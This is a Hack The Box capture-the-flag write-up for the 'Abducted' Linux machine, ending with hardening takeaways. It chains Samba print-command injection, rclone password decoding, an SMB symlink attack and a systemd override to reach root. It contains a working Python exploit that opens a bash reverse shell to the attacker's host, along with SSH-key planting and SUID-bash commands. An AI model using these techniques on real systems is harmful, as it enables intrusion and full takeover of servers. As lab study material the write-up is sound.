# HTB Write-Up: Abducted

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Abducted)   |
| Difficulty | Medium                                                         |
| OS         | Linux                                                          |
| Author     | Samurai                                                        |
| Date       | June 11, 2026                                                  |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Shares & RPC](#2-enumeration--smb-shares--rpc)
3. [Initial Access — Samba Print Command Injection](#3-initial-access--samba-print-command-injection)
4. [Lateral Movement — rclone Credential Recovery & SMB Symlink Attack](#4-lateral-movement--rclone-credential-recovery--smb-symlink-attack)
5. [Privilege Escalation — Systemd Service Override via Group Write Access](#5-privilege-escalation--systemd-service-override-via-group-write-access)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** for service discovery and version detection:

```bash
nmap -sC -sV 10.129.244.177
```

**Open Ports:**

| Port  | Service     | Notes                                      |
|-------|-------------|--------------------------------------------|
| 22    | SSH         | OpenSSH 9.6p1 — Ubuntu 24.04               |
| 139   | NetBIOS-SSN | Samba smbd 4                               |
| 445   | SMB         | Samba smbd 4 — primary attack surface      |

The machine's NetBIOS name was identified as **ABDUCTED**, running Samba on Linux. SMB signing was not required, and the SMB2 dialect (3.1.1) was in use.

---

## 2. Enumeration — SMB Shares & RPC

### 2.1 — Share Enumeration

SMB shares were enumerated using **netexec** with a guest (null) session, which was confirmed to be allowed:

```bash
netexec smb 10.129.244.177 -u 'guest' -p '' --shares
```

**Results:**

| Share        | Permissions | Comment                        |
|--------------|-------------|--------------------------------|
| HP-Reception | WRITE       | Reception printer              |
| projects     | —           | Hartley Group Project Files    |
| transfer     | —           | Staff file transfer            |
| IPC$         | —           | IPC Service                    |

The `HP-Reception` share was writable as guest. The `projects` and `transfer` shares denied anonymous access.

### 2.2 — RPC User Enumeration

A null session against the RPC endpoint was possible, allowing domain user enumeration:

```bash
rpcclient -U "" -N 10.129.244.177 -c "querydispinfo"
```

A single local user was discovered:

| Username | Full Name    | RID   |
|----------|--------------|-------|
| `scott`  | Scott Mercer | 0x3e8 |

### 2.3 — Samba Version & Printer Share Configuration

`srvinfo` via rpcclient confirmed the server identity:

```
ABDUCTED    Wk Sv PrQ Unx NT SNT Hartley Group Document Services
os version  : 6.1
```

Further inspection of the Samba configuration (obtained post-exploitation) revealed the printer share's key setting:

```ini
[HP-Reception]
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
```

The `print command` directive executes a shell command when a print job is submitted. The `%J` token is the job name — **user-controlled input passed directly to a shell command** — making this an OS command injection vector.

---

## 3. Initial Access — Samba Print Command Injection

### 3.1 — Vulnerability Background

Samba's `print command` configuration directive defines an OS-level command to execute when a print job is submitted to a printable share. The `%J` macro expands to the job name supplied by the client. When the share is guest-accessible with WRITE permissions, an unauthenticated attacker can submit a crafted print job whose name contains shell metacharacters, resulting in arbitrary command execution as the Samba service user (`nobody`).

This does not require a specific CVE — it is a **misconfiguration** allowing command injection through a standard Samba feature.

### 3.2 — Exploit

A Python exploit was written using the Samba `spoolss` DCE/RPC interface to open the printer, set the document name to a reverse shell command (using `|sh` as the job name to trigger shell interpretation), and submit the job:

```python
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST, LHOST, LPORT = "10.129.244.177", "10.10.15.24", 1337
DATA = ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n" % (LHOST, LPORT)).encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()

iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)
h = iface.OpenPrinter("\\\\%s\\HP-Reception" % RHOST, "", spoolss.DevmodeContainer(), 0x00000008)

i1 = spoolss.DocumentInfo1()
i1.document_name = "|sh"; i1.output_file = None; i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h); iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h); iface.EndDocPrinter(h); iface.ClosePrinter(h)
print("[+] job submitted")
```

A listener was set up before execution:

```bash
rlwrap nc -nvlp 1337
```

```bash
python3 exploit.py
# [+] job submitted
```

**Result — Shell obtained as `nobody`:**

```
connect to [10.10.15.24] from (UNKNOWN) [10.129.244.177] 38968
nobody@abducted:/var/spool/samba$
```

---

## 4. Lateral Movement — rclone Credential Recovery & SMB Symlink Attack

### 4.1 — rclone Configuration Discovery

Post-exploitation enumeration of `/opt/offsite-backup` revealed a backup configuration file:

```bash
nobody@abducted:/opt/offsite-backup$ cat rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

The password was stored in rclone's obfuscated format. rclone ships with a built-in `reveal` subcommand to decode it:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
# iXzvcib3SrpZ
```

**Recovered credential:** `scott : iXzvcib3SrpZ`

SSH login with the recovered password succeeded:

```bash
ssh scott@10.129.244.177
# Password: iXzvcib3SrpZ
```

**User flag retrieved from `/home/scott/user.txt`.**

`scott` had no sudo privileges.

### 4.2 — SMB Share Symlink Attack (Lateral Move to `marcus`)

Inspection of `/etc/samba/shares.conf` revealed a critical misconfiguration in the `transfer` share:

```ini
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus
   wide links = yes
   browseable = yes
```

Two key settings combined to create a privilege escalation path:

- `force user = marcus` — all file operations on this share execute as user `marcus`
- `wide links = yes` — symlinks pointing outside the share root are followed

This allows `scott` to plant a symlink inside `/srv/transfer` pointing at any directory on the filesystem. When accessed via SMB, file operations resolve through the symlink and execute as `marcus`.

**Attack chain:**

**Step 1** — Generate an SSH keypair:
```bash
ssh-keygen -q -t ed25519 -N '' -f /tmp/key
```

**Step 2** — Create a symlink from the transfer share into `marcus`'s home directory:
```bash
ln -s /home/marcus /srv/transfer/mh
```

**Step 3** — Use `smbclient` as `scott` to write the public key into `marcus`'s `.ssh/authorized_keys` via the symlink (file operations execute as `marcus` due to `force user`):
```bash
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/key.pub mh/.ssh/authorized_keys'
```

**Step 4** — SSH into `marcus` using the private key:
```bash
ssh -i /tmp/key marcus@localhost
```

**Shell obtained as `marcus`.**

---

## 5. Privilege Escalation — Systemd Service Override via Group Write Access

### 5.1 — Identifying the Attack Surface

Enumeration of files owned by non-standard groups revealed a writable directory:

```bash
find / -group operators 2>/dev/null
# /etc/systemd/system/smbd.service.d
```

`marcus` was a member of the `operators` group, which had write access to the `smbd.service.d` drop-in directory — the standard location for systemd service overrides. This directory controls how the `smbd` service starts, running as `root`.

### 5.2 — Systemd Drop-in Override

A service override file was written to execute a command as root before `smbd` starts. The chosen command set the SUID bit on `/bin/bash`:

```bash
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/chmod u+s /bin/bash
EOF
```

The daemon was reloaded and the service restarted to trigger the `ExecStartPre` hook:

```bash
systemctl daemon-reload
systemctl restart smbd
```

**Verification:**

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31 2024 /bin/bash
```

**Step 3** — Spawned a root shell using bash's `-p` flag (preserves EUID):

```bash
/bin/bash -p
bash-5.2# whoami
root
```

**Root flag retrieved from `/root/root.txt`.**

---

## 6. Summary

| Phase                  | Technique                                                                 | Result                            |
|------------------------|---------------------------------------------------------------------------|-----------------------------------|
| Recon                  | Nmap service scan                                                         | Ports 22, 139, 445 identified     |
| Enumeration            | netexec guest share enum; rpcclient null session                          | WRITE on printer share; user `scott` found |
| Initial Access         | Samba `print command` injection via spoolss DCE/RPC                      | Shell as `nobody`                 |
| Credential Recovery    | rclone.conf in `/opt/offsite-backup` → `rclone reveal`                   | `scott:iXzvcib3SrpZ`              |
| Lateral Move (scott)   | SSH with recovered credentials                                            | Shell as `scott`; user flag       |
| Lateral Move (marcus)  | SMB `wide links` + `force user` symlink attack → SSH key injection        | Shell as `marcus`                 |
| Privilege Escalation   | `operators` group write on `smbd.service.d` → systemd ExecStartPre hook  | Root shell; root flag             |

### Key Takeaways

- **Samba `print command` with guest-writable shares is a direct RCE path.** The `%J` job name macro passes user-controlled input to a shell command. Any printable Samba share accessible to unauthenticated users should be treated as a potential command injection surface. The `print command` directive should reference only hardened, non-interpolated paths, or the share should require authentication.
- **rclone obfuscation is not encryption.** The `rclone reveal` command decodes stored passwords trivially. Configuration files containing rclone credentials should be treated as plaintext secrets and protected accordingly — restricted permissions, secrets management tooling, and regular rotation.
- **`wide links = yes` combined with `force user` is a dangerous Samba misconfiguration.** Allowing symlinks to escape the share root while forcing all operations to run as a different user creates a straightforward path to writing arbitrary files as that user. `wide links` should remain disabled (the Samba default) in all multi-user environments.
- **Systemd drop-in directories with broad group write access grant effective root.** Any group that can write to a `.service.d` directory for a root-owned service can inject arbitrary commands into the service lifecycle. Group membership and directory permissions on systemd override paths should be audited as carefully as sudoers entries.
